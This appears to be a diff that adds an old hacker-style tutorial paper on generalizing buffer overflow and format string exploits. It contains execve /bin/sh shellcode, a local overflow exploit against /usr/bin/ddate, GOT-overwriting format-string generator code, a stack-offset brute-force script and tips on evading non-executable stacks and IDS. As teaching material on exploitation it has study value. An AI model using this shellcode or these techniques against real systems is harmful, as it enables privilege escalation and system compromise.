@@ -1,0 +1,329 @@
+--[ Exploit Modelling and Generalization
+
+--[ Introduction
+
+Exploit writing has been done for a long time, and much time and energy is
+consumed by those writing them. Most of the time exploits are variations
+on the same principles most of the time. Even if we accept this as 'truth',
+we see that pieces of code are written from scratch time and time again, and
+the same sort of calculations and techniques are performed most of the time.
+The impact of this has two sides, first of all lots of energy is wasted,
+since the writing could have cost the author much less time, the second is
+that most of the time the author seems happy with his achievements and is
+not planning to go and waste more energy implementing ease-of-use and more
+reliable use for something that's going to be fixed only few days after the
+vulnerability has been disclosed.
+This paper tries to generalize exploitation principles and also strives
+to build a non-formal exploitation model for use in buffer overflow and
+format string exploit building.
+
+--[ In the beginning there was...
+
+In order to try to generalize exploit principles it would come in handy to
+use a bottem-up approach, in other words, we will first try and find the
+most simple "axiom" on which to build and will build on that in order to
+tackle more complex cases. Obviously, the most easy case to be described is
+the easiest form in which a buffer overflow can occur, overflowing the buffer
+as far as user input is provided in a program that runs locally. This seems
+like a bit of a cliche to be talking about, but since we're working in a top
+down manner, I need to discuss it anyhow.
+When looking into these types of exploits the first stricking thing that
+clubbers a lot of exploit code is the way in which strings used to overflow
+with are generated - a lot of memcpy()s, loops and memset()s often make many
+exploits look annoyingly gibberish. This is not truly a problem, but it gets
+more nasty to keep track of what one is doing in situations where exploits
+grow bigger.
+So, first of all we'd like a general way in which to generate strings easily.
+This can either be done by using a programming language fit to creating a
+string easily (think of perl, the string and vector STL of C++ and so on), or
+writing a C function to do this by itself.
+
+The next striking thing is that the 'offset' and get_sp() principle is still
+used far to often. First of all one can be wondering why the get_sp()
+function was introduced - Linux uses virtual memory spaces, so what has the
+stack offset of the executing program got to do with the stack offset of the
+program that gets executed? The answer for this is pretty easy: there are
+'objects' that travel from one virtual memory space to the other, the most
+obvious one being the environment of the program. Since the environment is
+located at the base of the stack, it can influence the place at which the
+payload is going to appear when it fluctuates in size (ie. some given exploit
+could work in an environment of size 10, but as soon as it swells to size 200
+we're out of luck - to make up for this the offset was put in).
+The usefull part of this situation is that the environment starts out at a
+known fixed base. Knowing this it is easy to put in the payload to the exploit
+in an environment variable (traditionally called EGG), and use the injection
+vector to jump back there.
+This technique still suffers from fluctuations in the environment, depending
+on how many entries there are in front of it (ie. closer to the base).
+If we make sure that the payload is going to be the first entry in the
+environment, we can pinpoint it's exact location.
+Taking a look at /usr/src/linux/fs/exec.c gives us an insight in the
+do_execve() symbol. This function basically set the pointer "p" present in the
+linux_binprm structure to the end of the last memory page (this comes down to
+0xc0000000 in normal circumstances) minus the size of a void pointer, copies
+the real filename of the file we execute to "p", and afdter that the
+environment and the program arguments.
+This means that we can calculate the exact position of a given environment
+variable that contains our payload doing:
+0xc0000000-sizeof(void *)-sizeof(TARGET_FILENAME)-sizeof(shellcode)
+Obviously, we shall have to make sure that the shellcode is going to be the
+first environment variable, the easiest way to do this is crafting the
+environment of the target program by yourself.
+
+Combining all this we could write the most simple form of a local buffer
+overflow as follows:
+
+#include <stdio.h>
+
+#define FILENAME "/usr/bin/ddate"
+
+char code[]="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
+            "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb"
+            "\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+main()
+{
+   char *blah=NULL;
+   char *env[2]= {NULL, NULL};
+
+   strcreat(&blah, "+", 1);
+   strcreat(&blah, addytostr(0xc0000000-4-sizeof(FILENAME)-sizeof(code)), 1000);
+   strcreat(&env[0], code, 1);
+
+   execle(FILENAME, "ddate", blah, NULL, env);
+}
+
+strcreat() being a virtual function which appends the first argument times
+the second argument dynamically to the character array argument. This is much
+less complicated than most exploits out there, and keeps focussed on what is
+really going on, while not being clobbered by obfuscated C.
+
+The idea of being able to exactly put up some given bytes in memory comes
+in truly handy in many different situations. Especially when putting up
+"evil" structures, ranging from local stack frames, FILE structures to
+memory chunks knowledge of where the evil structure is going to be is the
+key element to successfull exploitation.
+
+--[ Format bugs
+
+A bit harder to model than it's ancient god-father, the overflow, but
+certainly more interesting.
+The general concept of a format bug is rather simple, we can provide a stream
+of addresses somewhere in memory space, reach this stream with our format by
+either walking the stack or selecting the appropriate element directly and
+finally write to this address using %n, which we have incremented to the value
+we wanted to write to the address.
+The problem with %n is that older libc versions cannot cope with any way to
+get a significantly large value in it (ie. 0xbffffe90 won't work). In order
+to avoid this problem, we use it's smaller counter part, %hn, which writes
+back a 16 bit word instead of a 32 bit dword, thus making only incrementations
+up to 65536 necessary, which any version of libc survives.
+
+The first thing we have to know is that we can only increment the value held
+in %hn during the processing of the format string. Because of this we can only
+write back values equal to %hn or bigger than %hn at a given point in time.
+
+Since we put in the address stream used by the format string, we control the
+sequence in which the addresses get written to. This makes it possible to make
+sure that addresses containing the smallest %hn values get written to first,
+and the bigger addresses later in time.
+
+We create an association between every address and word value we write to it,
+and build a list of these associations. We sort this list by value using our
+favourite sorting algorithm. After we did this we have found the correct order
+in which to write out the values still associated correctly with the addresses.
+
+We now take a look at how to use this idea in both of the cases which we used
+to find the addresses we provided in memory.
+
+When using stack walking by providing a format to get to the addresses to
+write back to we get into a bit of a problem, since %hn will end up with a
+certain value after this 'walk'. This is the reason that I recommend people
+using stack walking to walk using a format that makes %hn contain a value
+that can be determined, and not one that depends on what the stack contains
+at that time. Ie. using %.8x to stack walk will function properly, but using
+%d to do so might get you into trouble, since every zero dword on the stack
+will increment %hn by only one, while every fully used dword will increment
+%hn by a larger value.
+We now we're only going to be able to create a format string to write the
+association list the way we wanted to to memory if the initial %hn value
+determined by how far we have to stack-walk to get to the addresses is smaller
+or equal to the top value in the sorted list. If not, we're out of luck, it
+might be possible to model scenario's using overlapped writes, but I haven't
+looked into that yet.
+
+The second method to get to our addresses on stack is certainly more usefull.
+We can use a %<number>$ notation to specify the stack element argument number
+to use for the following format specifier. In other words, %100$.8x prints out
+the 100th element on the stack. In this way, we can select stack elemens and
+thus reach our address stream without incrementing %hn in any way. Thus, we
+can write back values ranging from 0x0000 to 0xffff to the provided addresses.
+
+Using the second form of the model gets truly scary, we're able to write back
+any value to any memory address that doesn't contain a NULL byte using it.
+An idea for the use might be chopping up the payload to the exploit in word
+pieces, using the given routines, and poke it to memory using the format bug
+itself. When modelled in this way a format bug will always be able to evade a
+non-executable stack patch (provided we can get the format big enough), and
+is ranged to a nice character set (0x24, 0x25, 0x30 - 0x39, 0x64, 0x6e).
+This in turn will evade any IDS that looks for shellcode+nops. Obviously, we
+don't need nops any more, since we are the ones that specify where the payload
+is going to end up in the first place.
+
+A piece of sample code might be:
+
+   association *assoc=NULL;
+   unsigned long GOTent=0x0804bf01;	/* Some global offset table entry */
+   unsigned long payload_addy=0x08043201;	/* Our payload address */
+
+   associate(&assoc, (unsigned char *)GOTent, payload_addy & 0xffff);
+   associate(&assoc, (unsigned char *)GOTent+2, (payload_addy >> 16) & 0xffff);
+
+   for(i=0;i<sizeof(hellcode)/2;i++) {
+      associate(&assoc, (unsigned char *)payload_addy,
+               ((u_int16_t *)hellcode)[i]);
+      payload_addy+=2;
+   }
+
+   quicksort(assoc);
+   printf("Format: %s\n", makeEvilFmt(assoc));
+   printf("Addresses: %s\n", makeAddresses(assoc));
+
+Some explanation might be proper, we plan our payload to end up at the address
+payload_addy (we assume this is a writeable part of virtual memory space), and
+overwrite a global offset table entry in order to gain control over EIP - we
+simply associate the two got entry addresses with two word values that are the
+payload_addy. Now the shellcode gets chopped up in words, and associated with
+memory addresses from 0x08043201 to higher ones. The entire list gets sorted,
+and now a format string of the second variant can certainly be generated.
+The addresses get sorted as well, since we use associations, and they are
+put up in the right order using the makeAddresses() function.
+
+Some nastiness we can run into is the fact that we cannot provide addresses
+in the stream which contain a NULL byte, so we shall have to find a way to
+overcome this problem.
+The most easy solution is to avoid NULL addresses altogether and simply
+check for them.
+When writing the shellcode out to memory, we can easily avoid the addresses
+completely, adjust the shellcode at runtime, to include a 0x04eb (little
+endian x86 instruction: jmp $0x04) words on the address before the one that
+contains a NULL and modify the operands to the "jmp" and "call" instructions
+that manage the position independentness of the payload by taking six extra
+bytes into account.
+
+The second idea that came to me was the option to make the format string
+modify the address string by itself, since the writeback of %hn can include
+NULL bytes. To model this we first need to know when this is actually possible.
+First of all we need to know the exact address of the address we are modifying.
+We can use the previously described environment tactic to realize this in local
+exploits.
+The second thing that's needed is that the address we modify hasn't already
+been used to write back to, since this would do no good.
+Suppose we have the following situation:
+
+[Addy stream - 0xbffffefc 0xbffffefd 0xbffffefe 0xbffffeff 0xbffffef0
+               0xbfffff00 ]
+
+Using the logic from the buffer overflow part we can see that this string is
+located at the addresses (using filename: ./a.out): 0xbfffffd8 to 0xbfffffef
+Since before those values, we find on the stack (higher addresses written down
+first for clarity):
+
+[ 0x000000 ] [ filename+0x00 ] [ 0x00 environment terminator ] [ environment ]
+
+The reason three more bytes are substracted is due to post alignment of the
+environment. Arguments supplied to the format string are supposed to be on
+addresses % 4 = 0. Since the ./a.out\0 occupies 8 bytes and the environment
+\0 terminator occupies another one, we need to post align for another 3 bytes
+in order to make the 'mod-4' condition true.
+
+Since we are on a little endian box, we want to change the word at address
+0xbfffffec from the dummy value of 0xff41 to 0xff00.
+We now see that this implies that 0xbfffff00 does NOT need to be written to
+before the value of 0xff00 gets written, which means we can only write to
+the NULL address a value that is bigger than 0xff00.
+In some situations this approach is more fruitfull than in others. It might
+come in handy for instance when a GOT entry is going to be located at a NULL
+byte.
+
+A small code example using a very silly dummy:
+
+dummy.c
+-------
+
+int main(int argc, char **argv)
+{
+   if(argv[1]) printf(argv[1]);
+   printf("\n\nAt 0xbfffff00: %x\n", *((unsigned short *)0xbfffff00));
+}
+
+One of the problems of format bugs is that we cannot pinpoint the exact
+relative stack location of the first argument taken in by our format string
+compared to the address stream we provide. We might be able to know where the
+address stream itself resides, but knowing were our va_list starts out is
+more nasty (in a hostile environment anyways). In this simple scenario I
+quickly brute forced the value. I'll show how after the example code.
+
+example.c
+---------
+
+#include <stdio.h>
+#include "fmtgen.h"
+
+#define FILENAME "./a.out"
+
+main(int argc, char **argv)
+{
+   char *env[2]= {NULL, NULL};
+   association *assoc=NULL;
+
+   associate(&assoc, 0xbffffefa, 0xff41);
+   associate(&assoc, 0xbffffefc, 0xff42);
+   associate(&assoc, 0xbffffefe, 0xff43);
+   associate(&assoc, 0xbfffff41, 0xff44); /* 41: Dummy address */
+   associate(&assoc, 0xbfffffec, 0xff00); /* Modify address stream here! */
+   quicksort(assoc);
+
+   env[0] = makeAddresses2(assoc, 3, A_POST);
+
+   execle("./a.out", "./a.out", makeEvilFmt2(assoc, atoi(argv[1])), NULL, env);
+}
+
+Our goal is to write the value 0xff45 to address 0xbfffff00. The dummy
+association address 0xbfffff41 will be modified on the fly to contain
+0xbfffff00 in the end. In order to find the correct stack element to start
+at, a quick little brute forcer was needed. It simply checked if a given
+stack element produced a core dump or not.
+
+brute.sh
+--------
+#!/bin/sh
+# If no coredump gets produced, mark the stack element number...
+
+for i in `seq 1 100` ; do
+   ./exp $i
+   if [ -e ./core ]; then
+      rm ./core
+   else
+      touch $i
+   fi
+done
+
+On my machine, this yielded 81 in the filesystem as a result.
+After running it, I got the following (incorrect) result:
+
+At 0xbfffff00: ffdc
+
+Somewhere there seemed to be a flaw in all this logic, and after fetching a
+good cup of coffee I set out to look where it could be.
+After 5 more minutes of fidgetting, I came to the conclusion that the number
+argument given to %d would be a minimum field width specifier, but not a
+maximum one. Thus when printing a value of 123 using %1d it seemed that %hn
+still would increment by 3 instead of 1. I had to build in increments of only
+one byte using %c when the incrementation would be done below a certain
+threshold value (ascii lenght of ULONG_MAX). The shellcode words were too far
+apart to be affected by this problem.
+
+More to come.
+
+-- Scrippie/ronald@grafix.nl
